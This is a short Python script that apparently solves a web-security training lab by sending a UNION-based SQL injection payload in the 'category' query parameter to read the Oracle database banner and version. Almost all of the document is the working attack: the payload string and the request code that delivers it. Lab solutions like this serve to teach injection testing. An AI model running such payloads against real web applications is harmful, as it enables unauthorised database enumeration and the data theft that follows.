################################################################################
#
# Lab: SQL injection attack, querying the database type and version on Oracle
#
# Hack Steps: 
#      1. Inject payload into 'category' query parameter
#      2. Observe that the database banner is returned in the response
#
################################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a470094038bc7ee8079a8d100a90064.web-security-academy.net"

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")
    print(Fore.WHITE + "❯❯ Injecting payload to retrieve the database version.. ", end="", flush=True)

    payload = "' UNION SELECT banner, null FROM v$version-- -"

    try:  
       requests.get(f"{LAB_URL}/filter?category={payload}")
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
